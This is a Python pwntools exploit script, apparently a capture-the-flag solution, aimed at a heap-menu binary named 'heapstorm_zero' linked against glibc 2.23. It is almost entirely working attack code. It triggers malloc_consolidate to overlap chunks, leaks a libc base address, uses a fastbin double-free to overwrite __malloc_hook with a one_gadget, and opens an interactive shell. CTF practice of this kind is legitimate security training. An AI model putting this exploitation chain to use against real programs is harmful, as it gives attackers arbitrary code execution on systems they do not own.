#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1

if local:
	cn = process('./heapstorm_zero')
	bin = ELF('./heapstorm_zero',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
else:
	#cn = remote('')
	pass


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

# result = (unsigned int)(a1 - 1) <= 0x37;
def add(size,con):
	cn.recvuntil('Choice:')
	cn.sendline('1')
	cn.recvuntil('size:')
	cn.sendline(str(size))
	cn.recvuntil('content:')
	cn.sendline(con)

def view(idx):
	cn.recvuntil('Choice:')
	cn.sendline('2')
	cn.recvuntil('index:')
	cn.sendline(str(idx))

def dele(idx):
	cn.recvuntil('Choice:')
	cn.sendline('3')
	cn.recvuntil('index:')
	cn.sendline(str(idx))

def triger_consolidate(pay=''):
	cn.recvuntil('Choice:')
	if pay=='':
		cn.sendline('1'*0x400)#malloc_consolidate

add(0x38,'a')#0

add(0x28,'a')#1
add(0x28,'a')#2
add(0x18,'a')#3
add(0x18,'a')#4
add(0x38,'x')#5
add(0x28,'x')#6
add(0x38,'x')#7
add(0x38,'x')#8
add(0x38,'x')#9
pay = 'a'*0x20+p64(0x200)+p64(0x20)
add(0x38,pay)#10

add(0x38,'end')#11

for i in range(1,11):
	dele(i)
# z('b malloc\ndir ~/Glibc/glibc-2.23/stdio-common/\ndir ~/Glibc/glibc-2.23/malloc/\nc')
triger_consolidate()

dele(0)
pay = 'a'*0x38
add(0x38,pay)#0

add(0x38,'a'*8)#1
add(0x38,'b'*8)#2
add(0x38,'c'*8)#3
add(0x38,'x')#4
add(0x38,'x')#5
add(0x28,'x')#6
add(0x38,'x')#7
add(0x38,'x')#8

dele(1)
dele(2)
dele(3)

triger_consolidate()
dele(11)
triger_consolidate()



add(0x28,'a')#1
add(0x28,'a')#2
add(0x18,'a')#3
add(0x18,'a')#9
add(0x38,'1'*0x30)#10
add(0x38,'2'*0x30)#11
add(0x28,'3'*0x30)#12
add(0x38,'4'*0x30)#13
add(0x38,'5'*0x30)#14
pay = 'a'*0x20+p64(0x200)+p64(0x20)
add(0x38,pay)#15

add(0x38,'end')#16

dele(1)
dele(2)
dele(3)
for i in range(9,16):
	dele(i)

triger_consolidate()

dele(0)
pay = 'a'*0x38
add(0x38,pay)#0

add(0x38,'a'*8)#1
add(0x38,'b'*8)#2
add(0x38,'c'*8)#3

view(4)
cn.recvuntil('Content: ')
lbase = u64(cn.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x3c4b20-88
success('lbase: '+hex(lbase))

dele(1)
dele(2)
dele(3)
triger_consolidate()

add(0x18,'A'*0x10)#1
add(0x28,'B'*0x20)#2
add(0x38,'C'*0x30)#3
add(0x18,'D'*0x10)#9

pay = p64(0)+p64(0x41)
add(0x18,pay)#6
add(0x28,'asd')
add(0x38,'zxc')#5,c
add(0x28,'qqq')#6,d


add(0x38,'a1')#14
add(0x28,'a2')#15

#fastbin dup
dele(5)
dele(14)
dele(0xc)

dele(6)
dele(15)
dele(0xd)


add(0x28,p64(0x41))
add(0x28,'a')
add(0x28,'a')

add(0x38,p64(lbase+0x3c4b20+8))
add(0x38,'a')
add(0x38,'a')
add(0x38,p64(lbase+0x3c4b20+8+0x20)+'\x00'*0x10+p64(0x41))
add(0x38,'\x00'*0x20+p64(lbase+libc.sym['__malloc_hook']-0x18))

add(0x18,'a'*0x18)
add(0x18,p64(lbase+0xf02a4)*2)

cn.recvuntil('Choice:')
cn.sendline('1')
cn.recvuntil('size:')
cn.sendline(str(0x18))

cn.interactive()

